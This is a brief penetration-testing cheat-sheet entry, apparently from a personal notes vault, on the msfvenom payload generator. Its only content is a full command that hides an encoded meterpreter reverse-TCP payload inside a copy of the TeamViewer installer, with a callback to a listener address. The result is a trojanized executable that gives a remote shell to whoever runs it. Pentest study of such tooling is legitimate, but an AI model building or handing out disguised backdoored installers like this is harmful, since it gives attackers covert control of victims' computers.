---
type: tool
category: exploitation
tags: [tool/exploitation, payloads, msfvenom]
aliases: [msfvenom]
---
# Overview
**Description:** Metasploit standalone payload generator and encoder.

## Commands
### Embed payload in .exe
It is possible to embed payloads in normal executable files such as "TeamViewer_Setup.exe". This increases the likelihood of being detected by antivirus software many times over: 

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
